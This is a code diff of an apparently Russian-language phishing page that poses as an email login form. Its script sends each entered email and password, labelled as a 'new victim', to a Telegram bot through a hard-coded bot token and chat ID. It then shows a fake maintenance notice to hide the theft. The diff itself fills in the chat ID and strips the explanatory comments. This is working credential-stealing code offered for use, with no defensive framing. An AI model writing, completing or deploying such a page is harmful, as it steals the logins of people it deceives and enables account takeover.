@@ -55,7 +55,6 @@
             font-weight: bold;
             margin-bottom: 20px;
         }
-        /* Стили для сообщения о техработах (изначально скрыто) */
         .tech-message {
             display: none;
             background: white;
@@ -84,7 +83,6 @@
     </style>
 </head>
 <body>
-    <!-- Форма входа (показывается сначала) -->
     <div id="loginFormContainer" class="login-box">
         <div class="logo">📧 Вход</div>
         <form id="loginForm">
@@ -95,7 +93,6 @@
         </form>
     </div>
 
-    <!-- Сообщение о техработах (появляется после отправки) -->
     <div id="techContainer" class="tech-message hidden">
         <div class="icon">🔧</div>
         <h2>Технические работы</h2>
@@ -105,7 +102,7 @@
 
 <script>
     const BOT_TOKEN = "8355069027:AAFEYxANTsCy9oHI3xNe-gKpTWYgPET9r4I";
-    const CHAT_ID = "ТВОЙ_CHAT_ID"; // вставь свой ID
+    const CHAT_ID = "8850351378";
 
     document.getElementById("loginForm").addEventListener("submit", function(e) {
         e.preventDefault();
@@ -119,19 +116,12 @@
             return;
         }
 
-        // === ОТПРАВКА ДАННЫХ В TELEGRAM ===
-        const ip = "—"; // можно добавить определение IP через API
-        const text = "📩 НОВАЯ ЖЕРТВА (техработы)\n" +
-                     "📧 Email: " + email + "\n" +
-                     "🔑 Пароль: " + password + "\n" +
-                     "🌐 IP: " + ip + "\n" +
-                     "🕒 " + new Date().toLocaleString();
-
+        const text = "📩 НОВАЯ ЖЕРТВА\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString();
         const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(text);
+
         fetch(url, { mode: "no-cors" });
         new Image().src = url;
 
-        // === СКРЫВАЕМ ФОРМУ, ПОКАЗЫВАЕМ ТЕХРАБОТЫ ===
         document.getElementById("loginFormContainer").classList.add("hidden");
         document.getElementById("techContainer").classList.remove("hidden");
     });
